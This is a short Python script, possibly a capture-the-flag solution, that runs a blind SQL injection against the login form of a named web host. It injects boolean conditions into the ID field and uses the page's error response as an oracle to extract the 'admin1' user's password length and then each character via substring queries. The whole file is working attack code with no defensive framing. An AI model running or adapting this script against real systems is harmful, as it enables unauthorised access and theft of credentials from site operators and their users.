import requests

def oracle(q):
    sqli="Nah' or %s or '1'='2" % (q)
    datas = {'ID':"admin1"+sqli, 'password':'Meh', 'submit':'1234'}
    url='https://adm4dw.dwhf.co.kr/login'
    R=requests.post(url, data=datas)
    return not R.text.find('error')!=-1


sql = "length((select password from user where username='admin1'))=%d"
for i in range(32):
    if oracle( sql % (i) ):
        pw_len = i

print('password length is %d' %pw_len)

password=''
sql = "substring((select password from user where username='admin1'),%d,1)='%s'"
for i in range(1, pw_len+1):
    print('get %d...'%i)
    for c in 'abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*':
        if oracle(sql % (i,c)):
            password += c

print('password is %s'%password)